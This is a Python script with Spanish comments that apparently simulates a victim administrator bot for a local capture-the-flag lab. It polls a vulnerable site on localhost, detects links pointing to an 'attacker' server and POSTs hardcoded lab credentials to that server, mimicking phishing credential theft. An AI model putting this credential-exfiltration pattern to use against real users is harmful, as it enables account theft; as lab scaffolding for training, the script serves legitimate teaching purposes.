import requests
import time
import re

# --- CONFIGURACIÓN ---
# La web vulnerable (donde se suben los links)
WEB_VULNERABLE = "http://127.0.0.1:8080"
# Tu servidor atacante (lo que busca el bot)
MI_IP_ATACANTE = "host.docker.internal:8000"

# Credenciales que el bot "regalará" al caer en la trampa
USER_VICTIMA = "daniel"
PASS_VICTIMA = "C@ughtm3napping123"

def revisar_links():
    print(f"🧐 [BOT] Entrando a {WEB_VULNERABLE} para buscar nuevos enlaces...")

    session = requests.Session()

    try:
        # 1. El bot entra a la página principal
        response = session.get(WEB_VULNERABLE)
        html = response.text

        # 2. Busca si hay algún enlace que apunte a TU servidor (puerto 8000)
        # Usamos una expresión regular simple para encontrar "http://host.docker.internal:8000..."
        enlaces_encontrados = re.findall(r'href="(http://' + re.escape(MI_IP_ATACANTE) + r'[^"]*)"', html)

        if enlaces_encontrados:
            link_malicioso = enlaces_encontrados[0]
            print(f"⚠️ [BOT] ¡Enlace sospechoso detectado en la base de datos!: {link_malicioso}")
            print("⚡ [BOT] El administrador hace clic y... ¡Cae en la trampa!")

            # 3. SIMULACIÓN DEL ROBO
            # El bot envía sus credenciales a tu servidor
            payload = {'username': USER_VICTIMA, 'password': PASS_VICTIMA}

            # Enviamos la petición POST a tu Netcat/Python
            try:
                requests.post(link_malicioso, data=payload, timeout=2)
                print("✅ [BOT] Credenciales enviadas al atacante.")
            except requests.exceptions.ConnectionError:
                print("❌ [BOT] El bot intentó enviar los datos, pero tu servidor (Netcat) está apagado.")

        else:
            print("✅ [BOT] No hay enlaces maliciosos nuevos. Todo limpio.")

    except Exception as e:
        print(f"❌ [ERROR] No puedo conectar con la web vulnerable: {e}")

# --- BUCLE INFINITO (Cada 2 minutos) ---
print("🤖 [SISTEMA] Servicio de Revisión de Enlaces iniciado.")
while True:
    revisar_links()

    print("💤 Esperando 2 minutos para la próxima revisión...")
    # Cuenta atrás visual rápida para no aburrirte esperando
    # Cambia 120 por el tiempo que quieras (ej: 10 segundos para pruebas)
    time.sleep(10)
    print("-" * 40)
